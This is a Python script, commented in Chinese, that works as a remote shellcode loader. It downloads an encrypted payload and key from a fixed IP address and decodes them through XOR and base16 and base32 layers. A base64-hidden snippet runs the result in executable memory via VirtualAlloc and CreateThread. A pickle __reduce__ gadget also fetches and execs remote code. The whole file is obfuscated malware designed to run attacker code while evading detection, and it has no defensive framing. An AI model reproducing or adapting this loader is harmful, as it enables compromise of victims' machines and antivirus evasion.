# -*- coding: UTF-8 -*-
import ctypes
import base64
import random
from sys import version_info
if version_info >= (3,0):
    from urllib.request import urlopen
else:
    from urllib2 import urlopen


def decrypt(code, key):
    # 设置随机数
    random.seed(key)
    # 异或解密
    xor_code = code.split('.')
    res_code = ''
    for i in xor_code:
        res_code = res_code + chr(int(i) ^ random.randint(0, 255))
    # 三重解码
    if version_info >= (3,0):
        shellcode = bytes.fromhex(res_code)
    else:
        shellcode = res_code.decode('hex')
    shellcode = base64.b16decode(shellcode)
    shellcode = base64.b32decode(shellcode)
    return shellcode


def runcode(shellcode):
    loader = "Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZT1jdHlwZXMuY191aW50NjQ7cnd4cGFnZT1jdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYygwLCBsZW4oc2hlbGxjb2RlKSwgMHgxMDAwLCAweDQwKTtjdHlwZXMud2luZGxsLmtlcm5lbDMyLlJ0bE1vdmVNZW1vcnkoY3R5cGVzLmNfdWludDY0KHJ3eHBhZ2UpLCBjdHlwZXMuY3JlYXRlX3N0cmluZ19idWZmZXIoc2hlbGxjb2RlKSwgbGVuKHNoZWxsY29kZSkpO2hhbmRsZT1jdHlwZXMud2luZGxsLmtlcm5lbDMyLkNyZWF0ZVRocmVhZCgwLCAwLCBjdHlwZXMuY191aW50NjQocnd4cGFnZSksIDAsIDAsIDApO2N0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChoYW5kbGUsIC0xKQ=="
    exec(base64.b64decode(loader))

class Runcode(object):
    def __init__(self, sc) -> None:
        global shellcode
        shellcode = sc
        
    def __reduce__(self):
        http = urllib3.PoolManager()
        response = http.request('GET', 'http://192.168.2.131/code2.txt')
        code = response.data.decode('utf-8')
        code = base64.b64decode(code)
        return (exec, (code,))



def get_data(url_shellcode, url_key):
    """远程获取shellcode"""
    # 远程加载shellcode, key
    key = urlopen(url_key).read().decode()
    shellcode = urlopen(url_shellcode).read().decode()
    return shellcode, key


if __name__ == "__main__":
    url_shellcode = "http://192.168.2.131/shellcode.txt"
    url_key = "http://192.168.2.131/key.txt"
    # 远程加载
    shellcode, key = get_data(url_shellcode, url_key)
    # 解码
    shellcode = decrypt(shellcode, key)
    # 加载shellcode
    runcode(shellcode)
